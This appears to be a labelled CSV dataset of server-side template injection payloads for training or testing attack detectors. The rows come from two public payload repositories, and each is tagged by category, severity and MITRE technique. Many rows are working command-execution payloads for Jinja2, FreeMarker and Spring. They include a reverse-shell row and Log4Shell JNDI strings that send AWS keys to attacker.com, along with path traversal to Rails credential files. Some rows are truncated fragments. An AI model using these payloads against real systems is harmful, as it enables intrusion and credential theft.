%7B%7Bdump%28app%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Bapp.request.server.all%7Cjoin%28%27%2C%27%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Bconfig.items%28%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%20%5B%5D.class.base.subclasses%28%29%20%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%27%27.class.mro%28%29%5B1%5D.subclasses%28%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%20%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%20%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%27%27%2E%5F%5Fclass%5F%5F%2E%5F%5Fbase%5F%5F%2E%5F%5Fsubclasses%5F%5F%28%29%5B227%5D%28%27cat%20%2Fetc%2Fpasswd%27%2C%20shell%3DTrue%2C%20stdout%3D%2D1%29%2Ecommunicate%28%29%7D%7D,SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%25%20for%20key%2C%20value%20in%20config.iteritems%28%29%20%25%7D%3Cdt%3E%7B%7B%20key%7Ce%20%7D%7D%3C/dt%3E%3Cdd%3E%7B%7B%20value%7Ce%20%7D%7D%3C/dd%3E%7B%25%20endfor%20%25%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%27a%27.toUpperCase%28%29%7D%7D%20%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%20request%20%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Bself%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%3C%23assign%20ex%20%3D%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B%20ex%28%22id%22%29%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%5B%23assign%20ex%20%3D%20%27freemarker.template.utility.Execute%27%3Fnew%28%29%5D%24%7B%20ex%28%27id%27%29%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Bapp.request.query.filter%280%2C0%2C1024%2C%7B%27options%27%3A%27system%27%7D%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27ls%27%29.read%28%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28request.args.input%29.read%28%29%7D%7D%7B%25endif%25%7D%7B%25endfor%25%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%24smarty.version%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7Bphp%7Decho%20%60id%60%3B%7B/php%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%5B%27id%27%5D%7Cfilter%28%27system%27%29%7D%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Brequest%7Cattr%28%5Brequest.args.usc%2A2%2Crequest.args.class%2Crequest.args.usc%2A2%5D%7Cjoin%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Brequest%7Cattr%28%5B%22_%22%2A2%2C%22class%22%2C%22_%22%2A2%5D%7Cjoin%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Brequest%7Cattr%28%5B%22__%22%2C%22class%22%2C%22__%22%5D%7Cjoin%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Brequest%7Cattr%28%22__class__%22%29%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Brequest.__class__%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7Brequest%7Cattr%28%27application%27%29%7Cattr%28%27%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f%27%29%28%27os%27%29%7Cattr%28%27popen%27%29%28%27id%27%29%7Cattr%28%27read%27%29%28%29%7D%7D%0A,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22new%20java.lang.String%28%27xxx%27%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22whoami%5C%5C%5C%22%29%3B%20x.start%28%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,High,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22netstat%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22uname%5C%5C%5C%22%2C%5C%5C%5C%22-a%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%22python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C%22ip%5C%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%5C%22/bin/cat%5C%22%2C%20%5C%22flag.txt%5C%22%5D%29%3B%27%22%29.read%28%29.zfill%28417%29%7D%7D%7B%25endif%25%7D%7B%25%20endfor%20%25%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%24%7BT%28java.lang.System%29.getenv%28%29%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27cat%20etc/passwd%27%29%7D%0A,SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2899%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28112%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29%29.getInputStream%28%29%29%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{2*2}}[[3*3]],SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{3*'3'}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
<%= 3 * 3 %>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
${6*6},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
${{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
@(6+5),SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
#{3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
#{ 3 * 3 },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{dump(app)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{config.items()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{ [].class.base.subclasses() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{''.class.mro()[1].subclasses()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{'a'.toUpperCase()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{ request }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"${""freemarker.template.utility.Execute""?new()(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{$smarty.version},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{php}echo `id`;{/php},CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{['id']|filter('system')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"{{request|attr(""__class__"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{request.__class__}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
${T(java.lang.System).getenv()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
root@ismailtasdelen:~# git clone https://github.com/payloadbox/ssti-payloads.git,SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
root@ismailtasdelen:~# git clone git@github.com:payloadbox/ssti-payloads.git,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
"{php}echo """,CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
",CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (readme-file-patch-1 branch)
        injection_entry += """"{{INJECTION_POINT}}/""""  # It will be renderred later with the payload.""",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"path = ""../../../../../../../../../../config/credentials.yml.enc{{""",DirTraversal_Path,SSTI,High,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"path = ""../../../../../../../../../../config/master.key{{""",DirTraversal_Path,SSTI,High,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"            req['Accept'] = ""../../../../../../../../../../tmp/result.txt{{""",DirTraversal_Path,SSTI,High,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:ldap://${java:version}.domain/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:ldap://${env:JAVA_VERSION}.domain/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:ldap://${sys:java.version}.domain/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:ldap://${sys:java.vendor}.domain/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:ldap://${hostName}.domain/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:dns://${hostName}.domain},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${${lower:jndi}:${lower:rmi}://127.0.0.1:1389/poc},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${j${loWer:Nd}i${uPper::}://127.0.0.1:1389/poc},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{3+3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",DirTraversal_Path,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"""healthCheckRegistry"": ""ldap://{{interactsh-url}}""",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load([""0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446""].pack(""H*"")) rescue nil'; done",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
curl -H 'Referer: {{readFile """"etc/passwd""""}}' http://localhost/""",SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${7*7},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${{7*7}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${class.getClassLoader()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${class.getResource("""").getPath()}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${class.getResource(""../../../../../index.htm"").getContent()}",DirTraversal_Path,SSTI,High,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${T(java.lang.System).getenv()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join("" "")}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${""freemarker.template.utility.Execute""?new()(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{'a'.toUpperCase()}} would result in 'A',SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ someString.toUPPERCASE() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% set cmd = 'id' %},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% set bytes = (1).TYPE,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ (1).TYPE,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${String x = new File('c:/windows/notepad.exe').text},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${String x = new File('/path/to/file').getText('UTF-8')},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${new File(""C:\Temp\FileName.txt"").createNewFile();}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${""http://www.google.com"".toURL().text}",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${new URL(""http://www.google.com"").getText()}",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${""calc.exe"".execute()}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${this.evaluate(""9*9"") //(this is a Script class)}",XSS_Script,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${7*7},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${request.getAttribute(""c"").add(""cmd.exe"")}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${request.getAttribute(""c"").add(""/k"")}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
